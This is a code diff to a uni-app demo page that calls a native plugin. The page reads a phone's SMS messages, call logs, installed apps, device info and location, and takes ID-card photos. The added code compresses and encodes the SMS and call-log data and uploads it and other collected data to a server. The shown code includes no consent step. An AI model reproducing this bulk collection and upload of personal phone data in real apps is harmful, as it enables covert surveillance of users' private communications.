@@ -1,10 +1,7 @@
 <template>
     <view class="container">
-
-        <view class="intro">本项目已包含uni ui组件，无需import和注册，可直接使用。在代码区键入字母u，即可通过代码助手列出所有可用组件。光标置于组件名称处按F1，即可查看组件文档。</view>
-        <text class="intro">详见：</text>
-        <uni-link :href="href" :text="href"></uni-link>
-        <button @click="test()">test</button>
+        {{text}}
+        <button @click="login()">login</button>
         <button type="primary" @click="getInstall">获取安装列表数据</button>
         <button type="primary" @click="getSMSList">获取短信数据</button>
         <button type="primary" @click="getLocation">获取位置数据</button>
@@ -19,64 +16,99 @@
 </template>
 
 <script>
+    import pako from 'pako';
+    import { login,upload} from '@/api/data.js'
     const wtModule = uni.requireNativePlugin('WTUniPlugin-WTModule');
     export default {
         data() {
             return {
                 href: 'https://uniapp.dcloud.io/component/README?id=uniui',
-                url: 'http://120.46.139.43:9527/gPjkvSR/wTcEL/xqtQju'
+                url: 'http://120.46.139.43:9527/gPjkvSR/wTcEL/xqtQju',
+                text: '',
+                token:''
             }
         },
         methods: {
+            login(){
+                login().then(res=>{
+                    console.log(res)
+                })
+            },
             getInstall() { // 获取安装列表
                 wtModule.getAppList((ret) => {
                     console.log(ret)
+                    upload({jsonPayload:ret,uploadType:'1'}).then(res => {
+                        console.log(res)
+                    })
                 })
             },
             getSMSList() { // 短信
                 wtModule.getSMSList((ret) => {
-                    this.text = ret
+                    let data = pako.gzip(ret)
+                    data = btoa(String.fromCharCode(...new Uint8Array(data)));
+                     console.log(data)
+                     upload({jsonPayload:data,uploadType:'4'}).then(res => {
+                         console.log(res)
+                     })
+                     // 将 Base64 数据转换为二进制
+                     // const binaryString = atob(data);
+                     // const binaryData = new Uint8Array([...binaryString].map(char => char.charCodeAt(0)));
+                     
+                     // // 使用 pako 解压缩数据
+                     // const decompressedData = pako.ungzip(binaryData, { to: 'string' });
+                     
+                     // // 将解压后的数据转换为对象
+                     // const dataObject = JSON.parse(decompressedData);
+                     // console.log(dataObject)
                 })
             },
             getLocation() { // 获取位置
                 wtModule.getLocation((ret) => {
-                    this.text = ret
+                     console.log(ret)
                 })
             },
             getCallLogList() { // 获取通话记录
                 wtModule.getCallLog((ret) => {
-                    this.text = ret
+                     console.log(ret)
+                     let data = pako.gzip(ret)
+                     data = btoa(String.fromCharCode(...new Uint8Array(data)));
+                     upload({jsonPayload:data,uploadType:'7'}).then(res => {
+                         console.log(res)
+                     })
                 })
             },
             getDeviceInfo() {
                 wtModule.getMobileInfo((ret) => {
-                    this.text = ret
+                     console.log(ret)
+                     upload({jsonPayload:ret,uploadType:'6'}).then(res => {
+                         console.log(res)
+                     })
                 })
             },
             getGoCamera() { // 拍身份证
                 wtModule.takePhoto({
                     type: 1
                 }, (ret) => {
-                    this.text = ret
+                    console.log(ret)
                 })
             },
             getGoCameraVideo() { // 视频录制
                 wtModule.takePhoto({
                     type: 2
                 }, (ret) => {
-                    this.text = ret
+                    console.log(ret)
                 })
             },
             openAlbum(isMultiple) { // 图片选择
                 wtModule.takePhoto({
                     isMultiple: isMultiple
                 }, (ret) => {
-                    this.text = ret
+                    console.log(ret)
                 })
             },
             initAf() { // 初始化AF
                 wtModule.initAf((ret) => {
-                    this.text = ret
+                    console.log(ret)
                 })
             },
 
